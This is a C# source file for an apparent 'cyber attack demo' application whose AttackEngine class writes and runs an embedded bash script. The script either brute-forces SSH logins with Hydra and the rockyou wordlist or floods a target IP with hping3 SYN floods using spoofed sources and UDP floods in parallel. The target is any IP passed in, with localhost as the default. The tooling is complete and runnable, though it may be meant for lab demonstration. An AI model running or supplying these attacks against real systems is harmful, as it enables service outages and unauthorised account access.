using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        public event Action<string>? OnLogReceived;
        
        public const string AttackScriptName = @"./Attack/attack.sh";

        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    if (timeoutSeconds > 0)
                    {
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
                        try
                        {
                            await process.WaitForExitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill...");
                            try { process.Kill(true); } catch { }
                        }
                    }
                    else
                    {
                        await process.WaitForExitAsync();
                    }
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Execution Failed: {ex.Message}");
            }
        }

        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                // 常に最新の内容で上書きする
                {
                    string scriptContent = @"#!/bin/bash

# root権限チェック
if [ ""$EUID"" -ne 0 ]; then
  echo ""エラー: root権限で実行してください。""
  exit 1
fi

TARGET_IP=${1:-""127.0.0.1""}
DURATION=${2:-""15""}
MODE_ARG=${3:-""dos""}

PORT=80
THREADS=4

cleanup() {
    echo """"
    echo ""[!] 停止シグナルを受信しました。プロセスを停止中...""
    pkill -P $$ hping3
    pkill -P $$ hydra
    echo ""[*] 完了。""
    exit
}

trap cleanup SIGINT SIGTERM EXIT

echo ""==========================================""
echo ""   Cyber Attack Simulator Script""
echo ""==========================================""
echo ""[*] TARGET: $TARGET_IP""
echo ""[*] DURATION: $DURATION sec""
echo ""[*] MODE: $MODE_ARG""
echo ""------------------------------------------""

if [ ""$MODE_ARG"" = ""hydra"" ]; then
    # --- Hydra SSH Crack ---
    echo ""[*] Starting Hydra SSH Password Cracking...""
    
    # 指定されたコマンドに変更
    # -l test: ユーザー名 test
    # -P /usr/share/wordlists/rockyou.txt: ロックユー辞書
    hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns

else
    # --- DoS Attack (hping3) ---
    echo ""[*] Starting DoS Flood Attack...""
    
    for (( i=1; i<=THREADS; i++ ))
    do
        # TCP SYN Flood
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
        # UDP Flood
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    done
    
    wait
fi
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    OnLogReceived?.Invoke($"[SYSTEM] Updated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}
